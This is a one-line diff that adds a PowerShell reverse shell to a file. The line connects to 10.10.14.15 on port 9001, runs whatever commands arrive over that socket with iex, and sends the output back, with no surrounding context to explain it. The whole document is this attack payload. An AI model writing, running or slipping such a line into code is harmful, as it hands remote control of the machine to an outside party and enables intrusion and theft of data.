@@ -1,0 +1,1 @@
+$c=[Net.Sockets.TcpClient]''10.10.14.15'',9001;$s=$c.GetStream();$b=,0*65536;while($i=$s.Read($b,0,$b.Count)){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$r=(iex $d 2>&1|oss)+''> '';$sb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Count);$s.Flush()}'
